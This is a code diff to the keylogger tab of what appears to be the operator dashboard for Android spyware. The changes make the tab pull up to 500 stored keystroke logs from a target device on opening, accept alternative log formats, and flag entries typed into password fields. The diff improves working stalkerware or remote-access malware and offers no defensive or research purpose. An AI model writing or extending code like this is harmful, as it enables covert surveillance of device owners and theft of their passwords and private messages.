@@ -26,7 +26,8 @@ function getAppShortName(pkg) {
 function dedupeByTimestampAndText(entries) {
   const seen = new Set();
   return entries.filter(e => {
-    const key = `${e.packageName}|${e.timestamp}|${e.text}`;
+    const text = e.text ?? e.content ?? e.typedText ?? '';
+    const key = `${e.packageName || e.package || ''}|${e.timestamp || e.postTime || e.time || ''}|${text}`;
     if (seen.has(key)) return false;
     seen.add(key);
     return true;
@@ -67,8 +68,9 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
       seenResultIds.current.add(r.id);
       try {
         const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-        if (r.command === 'get_keylogs' && data.logs) {
-          setStoredLogs(data.logs);
+        if (r.command === 'get_keylogs') {
+          const logs = data.logs || data.entries || data.keylogs || data.keylogEntries || data.data;
+          if (Array.isArray(logs)) setStoredLogs(logs);
         }
         if (r.command === 'list_keylog_files' && data.files) {
           setKeylogFiles(data.files);
@@ -79,6 +81,14 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
       } catch (_) {}
     });
   }, [results]);
+
+  // Load the device's persisted logs as soon as this tab is opened. Live SSE
+  // events are not guaranteed to include entries captured before the tab
+  // mounted, and waiting for the operator to press Refresh made the feed look
+  // empty even though the APK had stored the logs successfully.
+  useEffect(() => {
+    if (isOnline) sendCommand(deviceId, 'get_keylogs', { limit: 500 });
+  }, [deviceId, isOnline, sendCommand]);
 
   const fetchLiveLogs = useCallback(() => {
     setLoading(true);
@@ -204,7 +214,7 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
                   {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
                     <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
                   )}
-                  <span className="kl-text">{entry.text}</span>
+                   <span className="kl-text">{entry.text ?? entry.content ?? entry.typedText ?? ''}</span>
                 </div>
                 <div className="kl-ts">{formatDateTime(entry.timestamp, '')}</div>
               </div>
